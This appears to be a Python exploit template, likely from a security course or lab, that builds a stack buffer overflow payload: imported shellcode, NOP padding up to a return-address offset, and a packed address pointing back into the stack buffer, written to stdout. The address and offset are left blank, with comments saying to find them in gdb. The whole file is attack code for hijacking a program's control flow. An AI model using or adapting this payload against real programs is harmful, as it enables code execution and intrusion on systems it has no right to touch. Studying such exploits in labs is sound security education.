import sys
from struct import pack
from shellcode import shellcode

BUF_ADDR = None   # address of buf[] on the stack — gdb
OFFSET = None     # bytes from start of buf to the return address — gdb

payload = shellcode
payload += b"\x90" * (OFFSET - len(shellcode))
payload += pack("<I", BUF_ADDR)

sys.stdout.buffer.write(payload)